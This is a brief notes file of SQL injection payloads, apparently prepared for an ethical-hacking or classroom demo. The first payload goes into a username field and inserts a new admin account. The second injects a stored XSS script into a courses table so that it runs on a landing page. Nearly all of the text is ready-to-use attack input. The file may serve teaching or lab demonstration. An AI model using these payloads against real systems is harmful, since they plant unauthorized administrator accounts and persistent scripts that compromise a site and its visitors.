==================
BASIC INJECTIONS
==================

# (inside username field)
==============================
chamod'; insert into admin (username,password) values('user','user'); --   [2 or more spaces]



# when doing landing page XSS demo use this injection to inject to table and persist the script
==================================================================================================
'; insert into courses(courseName, description) values('EH','<script>alert("your have been hacked ..!");</script>'); --   